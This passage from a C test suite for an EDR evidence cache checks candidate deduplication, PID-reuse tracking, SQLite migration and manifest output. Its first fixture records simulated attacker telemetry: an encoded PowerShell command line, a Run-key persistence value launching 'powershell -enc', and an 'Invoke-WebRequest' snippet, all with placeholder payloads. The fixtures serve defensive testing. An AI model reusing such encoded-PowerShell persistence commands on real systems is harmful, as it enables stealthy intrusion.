  base.priority = 3u;
  base.pid = 81100u;
  base.event_time_ns = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  base.process_start_key = 0x81100u;
  base.process_creation_filetime_100ns = 133700000000081100ULL;
  snprintf(base.event_id, sizeof(base.event_id), "semantic-source-event");
  snprintf(base.endpoint_id, sizeof(base.endpoint_id), "ep-semantic-reuse");
  snprintf(base.process_name, sizeof(base.process_name), "powershell.exe");
  snprintf(base.image_path_canonical, sizeof(base.image_path_canonical),
           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
  snprintf(base.process_path_hash, sizeof(base.process_path_hash),
           "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
  snprintf(base.cmdline, sizeof(base.cmdline), "powershell.exe -EncodedCommand AAAAAA");
  snprintf(base.file_path, sizeof(base.file_path), "C:\\Temp\\candidate-a.ps1");
  snprintf(base.net_dst, sizeof(base.net_dst), "10.10.0.5");
  base.net_dport = 445u;
  snprintf(base.reg_key_path, sizeof(base.reg_key_path),
           "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
  snprintf(base.reg_value_name, sizeof(base.reg_value_name), "candidate-a");
  snprintf(base.reg_value_data, sizeof(base.reg_value_data), "powershell -enc AAAAAA");
  snprintf(base.script_snippet, sizeof(base.script_snippet), "Invoke-WebRequest A");
  snprintf(base.detection_context, sizeof(base.detection_context),
           "{\"rule_id\":\"R-SAME-RULE\",\"severity\":\"P0\"}");

  edr_local_evidence_cache_record_behavior(&base);
  EdrBehaviorRecord different_cmd = base;
  snprintf(different_cmd.event_id, sizeof(different_cmd.event_id), "semantic-source-command");
  snprintf(different_cmd.cmdline, sizeof(different_cmd.cmdline),
           "powershell.exe -EncodedCommand BBBBBB");
  edr_local_evidence_cache_record_behavior(&different_cmd);
  EdrBehaviorRecord different_path = base;
  snprintf(different_path.event_id, sizeof(different_path.event_id), "semantic-source-path");
  snprintf(different_path.file_path, sizeof(different_path.file_path), "C:\\Temp\\candidate-b.ps1");
  edr_local_evidence_cache_record_behavior(&different_path);
  EdrBehaviorRecord different_net = base;
  snprintf(different_net.event_id, sizeof(different_net.event_id), "semantic-source-network");
  snprintf(different_net.net_dst, sizeof(different_net.net_dst), "10.10.0.6");
  different_net.net_dport = 8443u;
  edr_local_evidence_cache_record_behavior(&different_net);
  EdrBehaviorRecord different_registry = base;
  snprintf(different_registry.event_id, sizeof(different_registry.event_id), "semantic-source-registry");
  snprintf(different_registry.reg_value_data, sizeof(different_registry.reg_value_data),
           "powershell -enc BBBBBB");
  edr_local_evidence_cache_record_behavior(&different_registry);
  EdrBehaviorRecord different_source_omission = base;
  snprintf(different_source_omission.event_id, sizeof(different_source_omission.event_id),
           "semantic-source-omission");
  snprintf(different_source_omission.source_completeness,
           sizeof(different_source_omission.source_completeness), "TRUNCATED");
  snprintf(different_source_omission.source_truncated_fields,
           sizeof(different_source_omission.source_truncated_fields),
           "source.process_name,source.exe_hash");
  edr_local_evidence_cache_record_behavior(&different_source_omission);
  EdrBehaviorRecord pid_reused = base;
  snprintf(pid_reused.event_id, sizeof(pid_reused.event_id), "semantic-source-pid-reused");
  pid_reused.process_start_key = 0x81101u;
  pid_reused.process_creation_filetime_100ns = 133700000000081101ULL;
  edr_local_evidence_cache_record_behavior(&pid_reused);

  edr_local_evidence_cache_get_status(&st);
  assert(st.candidate_requests == 7u && st.candidate_reused == 0u);
  assert(st.candidate_admission_attempts == 7u && st.candidate_admitted == 7u);
  assert(sqlite_table_count(db, "p0_candidates") == 7u);

  edr_local_evidence_cache_record_behavior(&base);
  edr_local_evidence_cache_get_status(&st);
  assert(st.candidate_requests == 8u && st.candidate_reused == 1u);
  assert(st.candidate_admission_attempts == 7u && st.candidate_admitted == 7u);
  assert(sqlite_table_count(db, "p0_candidates") == 7u);
  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("local_evidence_cache_semantic_reuse.sqlite-wal");
  (void)remove("local_evidence_cache_semantic_reuse.sqlite-shm");
}

/* An upgrade preserves one current PID row, but its tuple is durable proof:
 * a newer PID lifetime replaces every old field, an unknown record cannot
 * overwrite it, and both RTQ candidate rows retain their own >2^63 tuples. */
static void test_process_cache_generation_migration_and_restart_safe_rtq(void) {
  char db[512];
  const uint32_t pid = 96700u;
  const uint64_t a_start = UINT64_C(18446744073709551500);
  const uint64_t a_creation = UINT64_C(18446744073709551501);
  const uint64_t b_start = UINT64_C(18446744073709551502);
  const uint64_t b_creation = UINT64_C(18446744073709551503);
  const char *a_start_text = "18446744073709551500";
  const char *a_creation_text = "18446744073709551501";
  const char *b_start_text = "18446744073709551502";
  const char *b_creation_text = "18446744073709551503";
  struct timespec ts;
  EdrBehaviorRecord a, b, unknown;
  assert(make_test_sqlite_path(db, sizeof(db)) == 0);
  cleanup_test_sqlite_path(db);
  sqlite_exec_create_legacy_cache(db);
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  assert(sqlite_table_has_column(db, "process_cache", "process_start_key"));
  assert(sqlite_table_has_column(db, "process_cache", "process_creation_filetime_100ns"));
  assert(sqlite_table_has_column(db, "process_cache", "process_generation_source"));
  assert(sqlite_table_has_column(db, "process_cache", "parent_process_start_key"));
  assert(sqlite_table_has_column(db, "p0_candidates", "process_start_key"));
  assert(sqlite_table_has_column(db, "p0_candidates", "process_creation_filetime_100ns"));
  assert(sqlite_table_has_column(db, "p0_candidates", "process_generation_source"));
  assert(sqlite_table_has_column(db, "p0_candidates", "source_completeness"));
  assert(sqlite_table_has_column(db, "p0_candidates", "source_truncated_fields"));
  assert(sqlite_table_has_column(db, "p0_candidates", "normalized_command"));
  assert(sqlite_table_has_column(db, "p0_candidates", "script_path"));
  assert(sqlite_table_has_column(db, "p0_candidates", "exe_hash"));
  assert(sqlite_table_has_column(db, "p0_candidates", "username"));
  assert(sqlite_table_has_column(db, "p0_candidates", "user_sid"));
  assert(sqlite_table_has_column(db, "process_cache", "identity_source"));
  assert(sqlite_table_has_column(db, "process_cache", "identity_quality"));
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;

  init_record(&a, EDR_EVENT_NET_CONNECT);
  a.priority = 3u; a.pid = pid; a.event_time_ns = base - 2000000000LL;
  a.process_start_key = a_start;
  a.process_creation_filetime_100ns = a_creation;
  snprintf(a.process_generation_source, sizeof(a.process_generation_source),
           "etw_start_key_live_telemetry");
  snprintf(a.source_completeness, sizeof(a.source_completeness), "TRUNCATED");
  snprintf(a.source_truncated_fields, sizeof(a.source_truncated_fields),
           "source.process_name,source.exe_hash");
  snprintf(a.endpoint_id, sizeof(a.endpoint_id), "ep-persistent-generation");
  snprintf(a.event_id, sizeof(a.event_id), "persistent-A");
  snprintf(a.process_name, sizeof(a.process_name), "a.exe");
  snprintf(a.exe_path, sizeof(a.exe_path), "C:\\A-path.exe");
  snprintf(a.cmdline, sizeof(a.cmdline), "a.exe --old");
  snprintf(a.parent_name, sizeof(a.parent_name), "A-parent");
  snprintf(a.parent_path, sizeof(a.parent_path), "C:\\A-parent.exe");
  snprintf(a.file_path, sizeof(a.file_path), "C:\\A-candidate.bin");
  snprintf(a.net_dst, sizeof(a.net_dst), "10.96.0.1");
  a.net_dport = 445u;
  edr_local_evidence_cache_record_behavior(&a);

  b = a;
  b.event_time_ns = base;
  b.process_start_key = b_start;
  b.process_creation_filetime_100ns = b_creation;
  snprintf(b.event_id, sizeof(b.event_id), "persistent-B");
  snprintf(b.process_name, sizeof(b.process_name), "b.exe");
  snprintf(b.exe_path, sizeof(b.exe_path), "C:\\B-path.exe");
  snprintf(b.cmdline, sizeof(b.cmdline), "b.exe --new");
  snprintf(b.parent_name, sizeof(b.parent_name), "B-parent");
  snprintf(b.parent_path, sizeof(b.parent_path), "C:\\B-parent.exe");
  snprintf(b.file_path, sizeof(b.file_path), "C:\\B-candidate.bin");
  snprintf(b.net_dst, sizeof(b.net_dst), "10.96.0.2");
  edr_local_evidence_cache_record_behavior(&b);

  /* This is deliberately a high-priority candidate so it reaches the SQLite
   * upsert boundary. Its missing tuple must not replace durable B metadata. */
  unknown = b;
  unknown.event_time_ns = base + 1000000LL;
  unknown.process_start_key = 0u;
  unknown.process_creation_filetime_100ns = 0u;
  unknown.process_generation_source[0] = '\0';
  snprintf(unknown.event_id, sizeof(unknown.event_id), "persistent-unknown");
  snprintf(unknown.file_path, sizeof(unknown.file_path), "C:\\unknown-candidate.bin");
  edr_local_evidence_cache_record_behavior(&unknown);
  edr_local_evidence_cache_close();

  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  {
    sqlite3 *raw = NULL;
    sqlite3_stmt *st = NULL;
    assert(sqlite3_open_v2(db, &raw, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
    assert(sqlite3_prepare_v2(
               raw, "SELECT process_start_key,process_creation_filetime_100ns,"
                    "process_generation_source,path,cmdline,parent_name FROM process_cache "
                    "WHERE endpoint_id=? AND pid=?;", -1, &st, NULL) == SQLITE_OK);
    assert(sqlite3_bind_text(st, 1, "ep-persistent-generation", -1, SQLITE_TRANSIENT) == SQLITE_OK);
    assert(sqlite3_bind_int64(st, 2, (sqlite3_int64)pid) == SQLITE_OK);
    assert(sqlite3_step(st) == SQLITE_ROW);
    assert(strcmp((const char *)sqlite3_column_text(st, 0), b_start_text) == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 1), b_creation_text) == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 2), "etw_start_key_live_telemetry") == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 3), "C:\\B-path.exe") == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 4), "b.exe --new") == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 5), "B-parent") == 0);
    sqlite3_finalize(st);
    assert(sqlite3_close(raw) == SQLITE_OK);
  }
  {
    char tree[8192];
    assert(edr_local_evidence_cache_process_tree_json(
               pid, "ep-persistent-generation", tree, sizeof(tree)) == 0);
    assert(strstr(tree, "B-path.exe") != NULL);
    assert(strstr(tree, "A-path.exe") == NULL);
    assert(strstr(tree, b_start_text) != NULL && strstr(tree, b_creation_text) != NULL);
  }
  {
    char output[16384];
    cJSON *document;
    cJSON *rows;
    int saw_a = 0;
    int saw_b = 0;
    assert(edr_local_evidence_cache_query_json("{\"limit\":10,\"time_window_s\":600}", output,
                                               sizeof(output)) == 0);
    document = cJSON_Parse(output);
    assert(document != NULL);
    rows = cJSON_GetObjectItemCaseSensitive(document, "rows");
    assert(cJSON_IsArray(rows));
    cJSON *row = NULL;
    cJSON_ArrayForEach(row, rows) {
      cJSON *path = cJSON_GetObjectItemCaseSensitive(row, "file_path");
      cJSON *start = cJSON_GetObjectItemCaseSensitive(row, "process_start_key");
      cJSON *creation = cJSON_GetObjectItemCaseSensitive(
          row, "process_creation_filetime_100ns");
      cJSON *source_completeness = cJSON_GetObjectItemCaseSensitive(
          row, "source_completeness");
      cJSON *source_fields = cJSON_GetObjectItemCaseSensitive(
          row, "source_truncated_fields");
      if (!cJSON_IsString(path) || !path->valuestring) continue;
      if (strcmp(path->valuestring, "C:\\A-candidate.bin") == 0) {
        assert(cJSON_IsString(start) && cJSON_IsString(creation));
        assert(strcmp(start->valuestring, a_start_text) == 0);
        assert(strcmp(creation->valuestring, a_creation_text) == 0);
        assert(cJSON_IsString(source_completeness) &&
               strcmp(source_completeness->valuestring, "TRUNCATED") == 0);
        assert(cJSON_IsString(source_fields) &&
               strcmp(source_fields->valuestring,
                      "source.process_name,source.exe_hash") == 0);
        saw_a = 1;
      } else if (strcmp(path->valuestring, "C:\\B-candidate.bin") == 0) {
        assert(cJSON_IsString(start) && cJSON_IsString(creation));
        assert(strcmp(start->valuestring, b_start_text) == 0);
        assert(strcmp(creation->valuestring, b_creation_text) == 0);
        assert(cJSON_IsString(source_completeness) &&
               strcmp(source_completeness->valuestring, "TRUNCATED") == 0);
        assert(cJSON_IsString(source_fields) &&
               strcmp(source_fields->valuestring,
                      "source.process_name,source.exe_hash") == 0);
        saw_b = 1;
      }
    }
    assert(saw_a && saw_b);
    cJSON_Delete(document);
  }
  edr_local_evidence_cache_close();
  cleanup_test_sqlite_path(db);
}

/* A source record without a raw tuple may be bound by the event-time process
 * tree snapshot.  Persist that resolved tuple rather than serializing zeroes
 * from the original record, so a reopened RTQ query and both manifest forms
 * prove exactly which process lifetime supplied the evidence. */
static void test_snapshot_generation_persists_candidate_manifests_and_rtq(void) {
  const char *db = "local_evidence_cache_snapshot_generation.sqlite";
  const uint32_t pid = 97301u;
  const uint64_t start_key = UINT64_C(0x97301);
  const uint64_t creation = UINT64_C(133700000000062721);
  const char *start_key_text = "619265";
  const char *creation_text = "133700000000062721";
  struct timespec ts;
  EdrBehaviorRecord candidate;
  EdrBehaviorRecord post;
  char candidate_id[200];
  char bundle[16384];
  (void)remove(db);
  (void)remove("local_evidence_cache_snapshot_generation.sqlite-wal");
  (void)remove("local_evidence_cache_snapshot_generation.sqlite-shm");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(edr_pt_cache_put_generation(
             pid, 1u, "snapshot.exe", "snapshot --p0", "C:\\snapshot.exe", "parent.exe",
             (uint64_t)(base - 2000000000LL), start_key, creation) == 0);
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u;
  candidate.pid = pid;
  candidate.event_time_ns = base;
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-snapshot-generation");
  snprintf(candidate.event_id, sizeof(candidate.event_id), "snapshot-candidate");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "snapshot.exe");
  snprintf(candidate.exe_path, sizeof(candidate.exe_path), "C:\\snapshot.exe");
  snprintf(candidate.file_path, sizeof(candidate.file_path), "C:\\snapshot-candidate.bin");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "10.97.30.1");
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness), "TRUNCATED");
  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
           "source.process_name,source.exe_hash,source.parent_path");
  candidate.net_dport = 445u;
  /* Deliberately no raw tuple/source: only the historical snapshot is
   * authoritative for this event-time association. */
  edr_local_evidence_cache_record_behavior(&candidate);

  post = candidate;
  post.priority = 1u;
  post.type = EDR_EVENT_FILE_WRITE;
  post.event_time_ns = base + 1000000LL;
  snprintf(post.event_id, sizeof(post.event_id), "snapshot-post");
  snprintf(post.file_path, sizeof(post.file_path), "C:\\snapshot-post.bin");
  post.net_dport = 0u;
  edr_local_evidence_cache_record_behavior(&post);
  edr_local_evidence_cache_close();

  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  {
    sqlite3 *raw = NULL;
    sqlite3_stmt *st = NULL;
    assert(sqlite3_open_v2(db, &raw, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
    assert(sqlite3_prepare_v2(
               raw, "SELECT process_start_key,process_creation_filetime_100ns,"
                    "process_generation_source,source_completeness,source_truncated_fields "
                    "FROM p0_candidates WHERE event_time_ns=?;",
               -1, &st, NULL) == SQLITE_OK);
    assert(sqlite3_bind_int64(st, 1, (sqlite3_int64)base) == SQLITE_OK);
    assert(sqlite3_step(st) == SQLITE_ROW);
    assert(strcmp((const char *)sqlite3_column_text(st, 0), start_key_text) == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 1), creation_text) == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 2), "process_tree_snapshot") == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 3), "TRUNCATED") == 0);
    assert(strcmp((const char *)sqlite3_column_text(st, 4),
                  "source.process_name,source.exe_hash,source.parent_path") == 0);
    sqlite3_finalize(st);
    assert(sqlite3_close(raw) == SQLITE_OK);
  }
  sqlite_candidate_id_for_source_event(db, "snapshot-candidate", candidate_id,
                                       sizeof(candidate_id));
  sqlite_bundle_manifest_for_source_event(db, "snapshot-candidate", bundle, sizeof(bundle));
  assert_manifest_generation(bundle, start_key_text, creation_text, "process_tree_snapshot");
  assert_manifest_source_truncation(bundle, "TRUNCATED",
                                    "source.process_name,source.exe_hash,source.parent_path");
  assert(sqlite_post_artifact_count(db, candidate_id, "snapshot-post") == 1u);
  {
    sqlite3 *raw = NULL;
    sqlite3_stmt *st = NULL;
    assert(sqlite3_open_v2(db, &raw, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
    assert(sqlite3_prepare_v2(
               raw, "SELECT manifest_json FROM artifacts WHERE artifact_type='post_context';",
               -1, &st, NULL) == SQLITE_OK);
    assert(sqlite3_step(st) == SQLITE_ROW);
    assert_manifest_generation((const char *)sqlite3_column_text(st, 0), start_key_text,
                               creation_text, "process_tree_snapshot");
    assert_manifest_source_truncation((const char *)sqlite3_column_text(st, 0), "TRUNCATED",
                                      "source.process_name,source.exe_hash,source.parent_path");
    sqlite3_finalize(st);
    assert(sqlite3_close(raw) == SQLITE_OK);
  }
  {
    char output[8192];
    cJSON *document;
    cJSON *rows;
    int saw_candidate = 0;
    assert(edr_local_evidence_cache_query_json("{\"limit\":10,\"time_window_s\":600}",
                                               output, sizeof(output)) == 0);
    document = cJSON_Parse(output);
    assert(document != NULL);
    rows = cJSON_GetObjectItemCaseSensitive(document, "rows");
    assert(cJSON_IsArray(rows));
    cJSON *row = NULL;
    cJSON_ArrayForEach(row, rows) {
      cJSON *path = cJSON_GetObjectItemCaseSensitive(row, "file_path");
      cJSON *start = cJSON_GetObjectItemCaseSensitive(row, "process_start_key");
      cJSON *filetime = cJSON_GetObjectItemCaseSensitive(
          row, "process_creation_filetime_100ns");
      cJSON *source = cJSON_GetObjectItemCaseSensitive(row, "process_generation_source");
      cJSON *source_completeness = cJSON_GetObjectItemCaseSensitive(
          row, "source_completeness");
      cJSON *source_fields = cJSON_GetObjectItemCaseSensitive(
          row, "source_truncated_fields");
      if (!cJSON_IsString(path) || !path->valuestring ||
          strcmp(path->valuestring, "C:\\snapshot-candidate.bin") != 0) {
        continue;
      }
      assert(cJSON_IsString(start) && start->valuestring &&
             strcmp(start->valuestring, start_key_text) == 0);
      assert(cJSON_IsString(filetime) && filetime->valuestring &&
             strcmp(filetime->valuestring, creation_text) == 0);
      assert(cJSON_IsString(source) && source->valuestring &&
             strcmp(source->valuestring, "process_tree_snapshot") == 0);
      assert(cJSON_IsString(source_completeness) && source_completeness->valuestring &&
             strcmp(source_completeness->valuestring, "TRUNCATED") == 0);
      assert(cJSON_IsString(source_fields) && source_fields->valuestring &&
             strcmp(source_fields->valuestring,
                    "source.process_name,source.exe_hash,source.parent_path") == 0);
      saw_candidate = 1;
    }
    assert(saw_candidate);
    cJSON_Delete(document);
  }
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  (void)remove(db);
  (void)remove("local_evidence_cache_snapshot_generation.sqlite-wal");
  (void)remove("local_evidence_cache_snapshot_generation.sqlite-shm");
}

/* PID reuse must never attach B evidence to A's live window.  The same test
 * also proves two distinct B candidates retain separate post-context windows,
 * a semantic fallback artifact id does not collide at same timestamp/type,
 * and a late-old ring arrival cannot hide a recent pre-context record. */
static void test_context_generation_multicandidate_and_artifact_identity(void) {
  const char *db = "local_evidence_cache_generation_context.sqlite";
  const uint32_t pid = 96101u;
  const uint64_t generation_a = 0x96101u;
  const uint64_t generation_b = 0x96102u;
  struct timespec ts;
  EdrBehaviorRecord a, b, b2, event;
  char candidate_a[200], candidate_b[200], candidate_b2[200], bundle[4096];
  (void)remove(db);
  (void)remove("local_evidence_cache_generation_context.sqlite-wal");
  (void)remove("local_evidence_cache_generation_context.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(pid, 4u, "a.exe", "a", "C:\\A.exe", "parent-a",
                        (uint64_t)(base - 2000000000LL), generation_a) == 0);

  init_record(&a, EDR_EVENT_NET_CONNECT);
  a.priority = 3u; a.pid = pid; a.event_time_ns = base;
  set_record_generation(&a, generation_a);
  snprintf(a.endpoint_id, sizeof(a.endpoint_id), "ep-generation-context");
  snprintf(a.event_id, sizeof(a.event_id), "candidate-A");
  snprintf(a.process_name, sizeof(a.process_name), "a.exe");
  snprintf(a.net_dst, sizeof(a.net_dst), "10.0.0.1");
  a.net_dport = 445u;
  edr_local_evidence_cache_record_behavior(&a);
  assert(edr_pt_cache_mark_exit_generation(pid, generation_a,
                                            (uint64_t)(base + 1000000000LL)) == 0);
  assert(put_generation(pid, 4u, "b.exe", "b", "C:\\B.exe", "parent-b",
                        (uint64_t)(base + 2000000000LL), generation_b) == 0);

  b = a;
  b.event_time_ns = base + 3000000000LL;
  set_record_generation(&b, generation_b);
  snprintf(b.event_id, sizeof(b.event_id), "candidate-B");
  snprintf(b.process_name, sizeof(b.process_name), "b.exe");
  snprintf(b.net_dst, sizeof(b.net_dst), "10.0.0.2");
  edr_local_evidence_cache_record_behavior(&b);
  b2 = b;
  b2.event_time_ns = base + 4000000000LL;
  snprintf(b2.event_id, sizeof(b2.event_id), "candidate-B2");
  snprintf(b2.net_dst, sizeof(b2.net_dst), "10.0.0.3");
  edr_local_evidence_cache_record_behavior(&b2);

  sqlite_candidate_id_for_source_event(db, "candidate-A", candidate_a, sizeof(candidate_a));
  sqlite_candidate_id_for_source_event(db, "candidate-B", candidate_b, sizeof(candidate_b));
  sqlite_candidate_id_for_source_event(db, "candidate-B2", candidate_b2, sizeof(candidate_b2));

  event = b;
  event.priority = 1u; event.event_time_ns = base + 5000000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "B-file");
  event.type = EDR_EVENT_FILE_WRITE;
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\B-file.dll");
  event.net_dport = 0u;
  edr_local_evidence_cache_record_behavior(&event);
  event.event_time_ns++;
  snprintf(event.event_id, sizeof(event.event_id), "B-net");
  event.type = EDR_EVENT_NET_CONNECT;
  event.file_path[0] = '\0';
  snprintf(event.net_dst, sizeof(event.net_dst), "198.51.100.10");
  event.net_dport = 80u;
  edr_local_evidence_cache_record_behavior(&event);
  event.event_time_ns++;
  snprintf(event.event_id, sizeof(event.event_id), "B-registry");
  event.type = EDR_EVENT_REG_SET_VALUE;
  snprintf(event.reg_key_path, sizeof(event.reg_key_path), "HKCU\\Software\\B");
  snprintf(event.reg_value_name, sizeof(event.reg_value_name), "ValueB");
  snprintf(event.reg_op, sizeof(event.reg_op), "set");
  event.net_dst[0] = '\0'; event.net_dport = 0u;
  edr_local_evidence_cache_record_behavior(&event);
  assert(sqlite_post_artifact_count(db, candidate_a, "B-file") == 0u);
  assert(sqlite_post_artifact_count(db, candidate_a, "B-net") == 0u);
  assert(sqlite_post_artifact_count(db, candidate_a, "B-registry") == 0u);
  assert(sqlite_post_artifact_count(db, candidate_b, "B-file") == 1u);
  assert(sqlite_post_artifact_count(db, candidate_b2, "B-file") == 1u);
  assert(sqlite_post_artifact_count(db, candidate_b, "B-net") == 1u);
  assert(sqlite_post_artifact_count(db, candidate_b2, "B-registry") == 1u);

  /* No source id exercises the existing length-delimited semantic digest.
   * Same timestamp/type/PID but distinct paths must retain two rows. */
  event = b;
  event.priority = 1u; event.type = EDR_EVENT_FILE_WRITE;
  event.event_time_ns = base + 6000000000LL;
  event.event_id[0] = '\0'; event.net_dst[0] = '\0'; event.net_dport = 0u;
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\semantic-one.dll");
  edr_local_evidence_cache_record_behavior(&event);
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\semantic-two.dll");
  edr_local_evidence_cache_record_behavior(&event);
  assert(sqlite_post_artifact_total(db, candidate_b) == 6u);
  assert(sqlite_post_artifact_total(db, candidate_b2) == 5u);

  /* Arrival order X then late-old Y must not cause Y to stop a full bounded
   * pre-context scan before it reaches recent X. */
  event = b;
  event.priority = 1u; event.type = EDR_EVENT_FILE_WRITE;
  event.event_time_ns = base + 7000000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "recent-X");
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\recent-X.bin");
  edr_local_evidence_cache_record_behavior(&event);
  event.event_time_ns = base - 120000000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "late-old-Y");
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\late-old-Y.bin");
  edr_local_evidence_cache_record_behavior(&event);
  /* A delayed event from before B/B2's creation is not post-context merely
   * because it shares their generation and arrives late. */
  assert(sqlite_post_artifact_count(db, candidate_b, "late-old-Y") == 0u);
  assert(sqlite_post_artifact_count(db, candidate_b2, "late-old-Y") == 0u);
  /* Arrival before B3 with a future event timestamp must not make it pre
   * context for B3; it remains a valid post event for already-live B/B2. */
  event = b;
  event.priority = 1u; event.type = EDR_EVENT_FILE_WRITE;
  event.event_time_ns = base + 9000000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "future-Z");
  snprintf(event.file_path, sizeof(event.file_path), "C:\\Temp\\future-Z.bin");
  event.net_dst[0] = '\0'; event.net_dport = 0u;
  edr_local_evidence_cache_record_behavior(&event);
  assert(sqlite_post_artifact_count(db, candidate_b, "future-Z") == 1u);
  assert(sqlite_post_artifact_count(db, candidate_b2, "future-Z") == 1u);
  event = b;
  event.priority = 3u; event.event_time_ns = base + 8000000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "candidate-B3");
  snprintf(event.net_dst, sizeof(event.net_dst), "10.0.0.4");
  event.net_dport = 445u;
  edr_local_evidence_cache_record_behavior(&event);
  sqlite_bundle_manifest_for_source_event(db, "candidate-B3", bundle, sizeof(bundle));
  assert(strstr(bundle, "recent-X.bin") != NULL);
  assert(strstr(bundle, "late-old-Y.bin") == NULL);
  assert(strstr(bundle, "future-Z.bin") == NULL);
  sqlite_assert_all_artifact_manifests_parse(db);
  edr_pt_cache_shutdown();
  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("local_evidence_cache_generation_context.sqlite-wal");
  (void)remove("local_evidence_cache_generation_context.sqlite-shm");
}

/* cJSON owns quoting/structure.  The fixed module bound covers the maximum
 * escaped record fields; only truly invalid UTF-8 is rejected pre-commit. */
static void test_context_manifest_utf8_backslash_and_invalid_rejection(void) {
  const char *db = "local_evidence_cache_manifest_contract.sqlite";
  struct timespec ts;
  EdrBehaviorRecord candidate, event;
  EdrEvidenceCacheStatus before, after;
  char candidate_id[200];
  (void)remove(db);
  (void)remove("local_evidence_cache_manifest_contract.sqlite-wal");
  (void)remove("local_evidence_cache_manifest_contract.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u; candidate.pid = 96150u; candidate.event_time_ns = base;
  set_record_generation(&candidate, 0x96150u);
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-manifest-contract");
  snprintf(candidate.event_id, sizeof(candidate.event_id), "manifest-candidate");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "json.exe");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "10.0.0.50");
  candidate.net_dport = 445u;
  edr_local_evidence_cache_record_behavior(&candidate);
  sqlite_candidate_id_for_source_event(db, "manifest-candidate", candidate_id,
                                       sizeof(candidate_id));

  event = candidate;
  event.priority = 1u; event.type = EDR_EVENT_FILE_WRITE;
  event.event_time_ns = base + 1000000LL;
  snprintf(event.event_id, sizeof(event.event_id), "manifest-valid-utf8");
  event.net_dst[0] = '\0'; event.net_dport = 0u;
  size_t off = 0u;
  while (off + 4u < 1800u) {
    event.file_path[off++] = '\\';
    event.file_path[off++] = 'x';
  }
  snprintf(event.file_path + off, sizeof(event.file_path) - off,
           "-utf8-\xE6\xB5\x8B\xE8\xAF\x95");
  snprintf(event.dns_query, sizeof(event.dns_query), "example-\xE6\xB5\x8B\xE8\xAF\x95.invalid");
  snprintf(event.reg_key_path, sizeof(event.reg_key_path), "HKCU\\Software\\\\\\valid-utf8");
  edr_local_evidence_cache_record_behavior(&event);
  assert(sqlite_post_artifact_count(db, candidate_id, "manifest-valid-utf8") == 1u);
  sqlite_assert_all_artifact_manifests_parse(db);

  edr_local_evidence_cache_get_status(&before);
  event.event_time_ns++;
  snprintf(event.event_id, sizeof(event.event_id), "manifest-max-valid");
  memset(event.file_path, '\\', sizeof(event.file_path) - 1u);
  event.file_path[sizeof(event.file_path) - 1u] = '\0';
  memset(event.dns_query, '\\', sizeof(event.dns_query) - 1u);
  event.dns_query[sizeof(event.dns_query) - 1u] = '\0';
  memset(event.reg_key_path, '\\', sizeof(event.reg_key_path) - 1u);
  event.reg_key_path[sizeof(event.reg_key_path) - 1u] = '\0';
  memset(event.reg_value_name, '\\', sizeof(event.reg_value_name) - 1u);
  event.reg_value_name[sizeof(event.reg_value_name) - 1u] = '\0';
  edr_local_evidence_cache_record_behavior(&event);
  edr_local_evidence_cache_get_status(&after);
  assert(after.manifest_rejections == before.manifest_rejections);
  assert(sqlite_post_artifact_count(db, candidate_id, "manifest-max-valid") == 1u);
  sqlite_assert_all_artifact_manifests_parse(db);

  event.event_time_ns++;
  snprintf(event.event_id, sizeof(event.event_id), "manifest-invalid-utf8");
